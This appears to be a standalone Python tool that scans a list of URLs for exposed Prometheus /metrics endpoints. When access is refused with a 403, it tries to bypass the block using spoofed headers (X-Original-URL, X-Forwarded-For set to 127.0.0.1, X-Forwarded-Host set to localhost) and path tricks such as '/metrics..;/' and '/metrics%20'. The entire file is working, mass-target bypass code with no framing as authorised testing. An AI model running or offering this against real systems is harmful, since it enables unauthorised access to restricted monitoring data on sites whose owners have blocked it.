import requests
import sys
from colorama import Fore, Style

# Define headers and bypass methods
BYPASS_HEADERS = {
    "X-Original-URL": "/metrics",
    "X-Rewrite-URL": "/metrics",
    "X-Forwarded-For": "127.0.0.1",
    "X-Forwarded-Host": "localhost",
}

BYPASS_PATHS = [
    "/metrics/",
    "/metrics/.",
    "/metrics..;/",
    "/metrics%20",
    "/metrics?",
    "/metrics/*",
]

def check_metrics(url):
    try:
        response = requests.get(f"{url}/metrics", timeout=5)
        print(f"DEBUG: Response Code for {url}/metrics: {response.status_code}")
        if response.status_code == 200:
            return url, True
        elif response.status_code == 403:
            return attempt_bypass(url)
        else:
            return url, False
    except requests.RequestException as e:
        print(f"Error connecting to the URL: {e}")
        return url, False

def attempt_bypass(url):
    print(f"Attempting 403 bypass for {url}/metrics")
    try:
        # Try adding bypass headers
        for header_name, header_value in BYPASS_HEADERS.items():
            response = requests.get(f"{url}/metrics", headers={header_name: header_value}, timeout=5)
            print(f"DEBUG: Response Code with {header_name}: {response.status_code}")
            if response.status_code == 200:
                return f"{url}/metrics (bypassed with header: {header_name})", True

        # Try bypass paths
        for bypass_path in BYPASS_PATHS:
            response = requests.get(f"{url}{bypass_path}", timeout=5)
            print(f"DEBUG: Response Code for {url}{bypass_path}: {response.status_code}")
            if response.status_code == 200:
                return f"{url}{bypass_path} (bypassed with path: {bypass_path})", True

        # If no bypass works
        return url, False
    except requests.RequestException as e:
        print(f"Error during bypass attempt: {e}")
        return url, False

def test_urls(file_path):
    with open(file_path, 'r') as file:
        urls = file.readlines()
    
    urls = [url.strip() for url in urls]

    for url in urls:
        url, is_accessible = check_metrics(url)
        if is_accessible:
            print(f"{Fore.GREEN}Accessible: {url}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}Not Accessible: {url}{Style.RESET_ALL}")

def main():
    if len(sys.argv) != 2:
        print("Usage: python check_prometheus_metrics.py <input_file>")
        sys.exit(1)
    
    file_path = sys.argv[1]
    test_urls(file_path)

if __name__ == "__main__":
    main()
